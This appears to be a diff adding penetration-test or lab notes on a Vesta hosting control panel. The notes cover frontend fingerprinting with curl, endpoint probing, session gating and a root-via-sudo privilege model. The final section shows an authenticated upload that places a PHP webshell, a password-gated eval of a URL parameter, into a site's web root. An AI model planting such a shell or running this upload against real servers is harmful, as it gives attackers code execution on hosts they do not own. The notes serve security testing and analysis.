@@ -1,0 +1,82 @@
+=== Panel fingerprint: https://192.168.161.156:8083/ ===
+curl -sk https://192.168.161.156:8083/ | grep -iE 'title|static/js'
+
+<!doctype html><html lang="en"><head><meta charset="utf-8"/>
+<link rel="icon" href="/images/favicon.ico"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"/>
+<meta name="theme-color" content="#000000"/>
+<link rel="manifest" href="/manifest.json"/>
+<title>Vesta</title>
+<link href="/static/css/2.6c9f324a.chunk.css" rel="stylesheet"/>
+<link href="/static/css/main.55ab5a88.chunk.css" rel="stylesheet"/>
+</head><body><noscript>You need to enable JavaScript to run this app.</noscript>
+<div id="root"></div>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" ...></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" ...></script>
+<script>!function(e){function r(r){...}var a=this["webpackJsonpreact-control-panel"]=...</script>
+<script src="/static/js/2.5dc90ea3.chunk.js"></script>
+<script src="/static/js/main.57f35a42.chunk.js"></script></body></html>
+
+Reading:
+  webpackJsonpreact-control-panel  -> React SPA frontend, shipped in Vesta 0.9.8-27
+  <div id="root">                  -> client-side app, no server-rendered login form
+  per-bundle content hashes         -> React build, Nov 2021 era
+
+
+=== Endpoint probe (the 2586-byte false positive) ===
+for p in /upload/index.php /upload/ /api/index.php /api/ /manifest.json /; do
+  printf '%-22s ' "$p"
+  curl -sk -m 10 -o /dev/null -w 'http=%{http_code} size=%{size_download}\n' \
+    "https://192.168.161.156:8083$p"
+done
+
+/upload/index.php      http=200 size=2586
+/upload/               http=200 size=2586
+/api/index.php         http=200 size=0
+/api/                  http=200 size=0
+/manifest.json         http=404 size=1254
+/                      http=200 size=2586
+
+Reading:
+  / and /upload/index.php return the SAME 2586 bytes -> same file, not an endpoint.
+  /api/ returns 200 with a zero-length body          -> directory exists, empty index.
+  /manifest.json is 404                              -> the SPA does not ship one here.
+
+Source of the 2586 bytes (outroll/vesta, web/upload/index.php, 66 bytes):
+  <?php include($_SERVER['DOCUMENT_ROOT'].'/static/index.html'); ?>
+
+
+=== Upload handler is gated (web/upload/UploadHandler.php) ===
+include($_SERVER['DOCUMENT_ROOT']."/inc/main.php");
+
+web/inc/main.php:
+  session_start();
+  if ((!isset($_SESSION['user'])) && (!defined('NO_AUTH_REQUIRED'))) {
+      header("Location: /login/"); exit;
+  }
+  if($_SESSION['user_combined_ip'] != $user_combined_ip && $_SERVER['REMOTE_ADDR'] != '127.0.0.1'){
+      session_destroy(); header("Location: /login/"); exit;
+  }
+
+Reading: unauthenticated upload is not possible; the session is also pinned to the
+client IP, with 127.0.0.1 exempt.
+
+
+=== Privilege model (web/inc/main.php) ===
+define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');
+
+Reading: every panel action runs /usr/local/vesta/bin/v-* as root on behalf of
+a normal panel user. Argument construction is string concatenation.
+
+
+=== Upload primitive (as jack) ===
+POST /api/v1/upload/?dir=/home/jack/web/4wfarbc2dg.poc/public_html
+     files=@ownwebshell.php
+
+-> ownwebshell.php written into a docroot served by Apache + mod_fcgid,
+   i.e. executed as the vhost owner (jack), not www-data.
+
+webshell content:
+  <?php
+  if (@$_GET["password"] != "e43c9f07ed59712efa492aa0ae259cd0") exit();
+  eval($_GET["e"]);
